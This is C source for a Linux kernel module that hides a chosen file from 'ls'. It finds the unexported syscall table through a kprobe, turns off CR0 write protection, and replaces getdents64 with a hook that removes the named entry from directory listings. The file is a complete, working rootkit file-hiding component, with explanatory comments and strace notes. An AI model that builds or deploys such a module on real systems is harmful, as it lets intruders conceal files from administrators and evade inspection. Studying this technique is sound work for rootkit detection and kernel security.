// Hide files from `ls` by hooking `getdents64(2)`.

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kprobes.h>
#include <linux/delay.h>	// msleep
#include <linux/dirent.h>	// linux_dirent64
#include <linux/uaccess.h>
#include <asm/string.h>

#ifndef CONFIG_ARCH_HAS_SYSCALL_WRAPPER
#error "This module only works on systems with CONFIG_ARCH_HAS_SYSCALL_WRAPPER enabled"
#endif

#ifndef CONFIG_KPROBES
#error "This module only works on system with kprobes"
#endif

static char *filename;
module_param(filename, charp, 0644);

static unsigned long **sys_call_table = NULL;

// The original implementation of the hooked system call.
static asmlinkage long (*orig_getdents64_impl)(const struct pt_regs *);

// NOTE:
// In `/home` (any directory works) `strace ls` gives:
//
// openat(AT_FDCWD, ".", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
// fstat(3, {st_mode=S_IFDIR|0755, st_size=12, ...}) = 0
// getdents64(3, 0x565198465710 /* 3 entries */, 32768) = 80
// getdents64(3, 0x565198465710 /* 0 entries */, 32768) = 0
// close(3)
//
// The first `getdents64(2)` call returns all three entries in the directory.
// I assume the second checks if there are any more (in case the buffer passed
// to the syscall was too small). Running `2>&1 strace ls | grep '"."'` confirms
// that the listed directory is never opened anywhere else. So the `getdents64(2)`
// calls are the only way for `ls` to access information about the directory
// contents.

enum { dents_buf_cap = 60000 };	// Big enough for most calls.
static char dents_buf[dents_buf_cap];

// This hook behaves like getdents64(2) but hides the file called `filename` from being shown.
static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
	// ssize_t getdents64(int fd, void dirp[.count], size_t count);
	int fd = (int) regs->di;
	struct linux_dirent64 __user *dents = (struct linux_dirent64 __user *) regs->si;
	unsigned int n_dents = (unsigned int) regs->dx;

	pr_info("hide-file: caught %s (%d) call getdents64(fd=%d, dents=%p, count=%d)\n",
		current->comm, current->pid, fd, dents, n_dents);

	// Execute the syscall
	long n_read = orig_getdents64_impl(regs);

	if (n_read <= 0)
		return n_read;

	if (n_read > dents_buf_cap) {
		pr_alert("Read more that can be copied into the buffer\n");
		return n_read;
	}

	// Get a copy of the data from userspace for easy access.
	if (copy_from_user(&dents_buf, dents, n_read))
		return -1;

	// Iterate all directory entries. If an entry has the name of the file that should be hidden, it's deleted.
	struct linux_dirent64 *d;
	for (long i = 0; i < n_read;) {
		d = (struct linux_dirent64 *) (dents_buf + i);

		// Hide `filename` if we see it
		if (strcmp(d->d_name, filename) == 0) {
			// We want to delete the directory entry at `d` points to. So we move all entries
			// that follow the entry at `d` to the address `d`. The number of bytes read
			// must be reduced by the size of the entry at `d` since that entry is now gone.
			n_read -= d->d_reclen;
			if (n_read < 0) // Possible if `dents_buf` was too small for all the data.
				break; 
			memmove(d, (char *) d + d->d_reclen, n_read - i);

			// Now update all the offsets in the directory entries.
			for (long k = 0; k < n_read; ) {
				d = (struct linux_dirent64 *) (dents_buf + k);
                                k += d->d_reclen;
				d->d_off = k;
			}
		} else {
			i += d->d_reclen;
		}
	}

	// Put the (potentially modified) directory entries back into user memory.
        if (copy_to_user(dents, dents_buf, n_read))
		return -1;

	return n_read;
}

// Get a pointer to the hidden `sys_call_table` symbol.
static unsigned long **get_sys_call_table(void)
{
	unsigned long (*kallsyms_lookup_name)(const char *name);
	struct kprobe probe = { .symbol_name = "kallsyms_lookup_name" };

	if (register_kprobe(&probe) < 0) {
		pr_alert("Failed to insert kprobe on kallsyms_lookup_name");
		return 0;
	}

	kallsyms_lookup_name = (unsigned long (*)(const char *)) probe.addr;
	unregister_kprobe(&probe);

	return (unsigned long **) kallsyms_lookup_name("sys_call_table");
}

static void enable_write_prot(void)
{
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	asm volatile("mov %0, %%cr0" : "+r"(cr0) : : "memory");
}

static void disable_write_prot(void)
{
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
        asm volatile("mov %0, %%cr0" : "+r"(cr0) : : "memory");
}

static int __init init_getdents64_hook(void)
{
	if ((sys_call_table = get_sys_call_table()) == NULL)
		return -1;

	// Save the original syscall and replace it with our hook
	orig_getdents64_impl = (void*) sys_call_table[__NR_getdents64];
	disable_write_prot();
	sys_call_table[__NR_getdents64] = (unsigned long *) hooked_getdents64;
	enable_write_prot();

	pr_info("Successfully hooked getdents64\n");

	return 0;
}

static void __exit exit_getdents64_hook(void)
{
	if (sys_call_table == NULL)
		return;

	if ((unsigned long *) hooked_getdents64 != sys_call_table[__NR_getdents64]) {
		pr_alert("Syscall hook changed unexpectedly. Can't reliably restore it\n");
		return;
	}

	disable_write_prot();
	sys_call_table[__NR_getdents64] = (unsigned long *) orig_getdents64_impl;
	enable_write_prot();

	msleep(2000);           // TODO: Why is this here?
}

module_init(init_getdents64_hook);
module_exit(exit_getdents64_hook);

MODULE_LICENSE("GPL");
